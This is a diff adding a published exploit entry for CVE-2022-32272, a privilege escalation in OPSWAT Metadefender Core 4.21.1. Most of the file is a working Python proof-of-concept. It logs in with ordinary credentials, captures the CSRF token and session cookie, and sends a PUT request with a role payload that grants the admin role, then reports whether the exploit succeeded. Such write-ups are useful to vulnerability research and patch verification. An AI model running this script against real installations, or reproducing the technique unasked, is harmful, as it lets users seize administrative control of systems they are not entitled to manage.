@@ -1,0 +1,58 @@
+id: 38355
+date: 03/28/2023
+title: OPSWAT Metadefender Core - Privilege Escalation Exploit
+author: Ulascan Yildirim
+cves: CVE-2022-32272
+
+# Exploit Title: OPSWAT Metadefender Core - Privilege Escalation
+# Exploit Author: Ulascan Yildirim
+# Vendor Homepage: https://www.opswat.com/
+# Version: Metadefender Core 4.21.1
+# Tested on: Windows / Linux
+# CVE : CVE-2022-32272
+# =============================================================================
+# This is a PoC for the Metadefender Core Privilege escalation vulnerability.
+# To use this PoC, you need a Username & Password.
+# The OMS_CSRF_TOKEN allows users to execute commands with higher privileges.
+# =============================================================================
+
+#!/usr/bin/env python3
+import requests
+import json
+from getpass import getpass
+
+url = input("Enter URL in this Format (http://website.com): ")
+username = input("Username: ")
+password = getpass("Password: ")
+
+url_login = url+'/login'
+url_user = url+'/user'
+logindata = {"user":username,"password":password}
+
+## Get the OMS_CSRF_TOKEN & session cookie
+response_login = requests.post(url_login, json = logindata).json()
+json_str = json.dumps(response_login)
+resp = json.loads(json_str)
+token = resp['oms_csrf_token']
+session = resp['session_id']
+
+## Prepare Header & Cookie
+headers = {
+    "oms_csrf_token": token,
+}
+cookie = {
+    "session_id_ometascan": session
+}
+
+## Set Payload to get Admin role
+payload = '{"roles": ["1"]}'
+
+response = requests.put(url_user,headers=headers,cookies=cookie,data=payload)
+print("Response status code: "+str(response.status_code))
+
+if response.status_code == 200:
+    print("Expolit Successful!")
+else:
+    print("Exploit Unsuccessful")
+
+#  0day.today [2023-04-03]  #
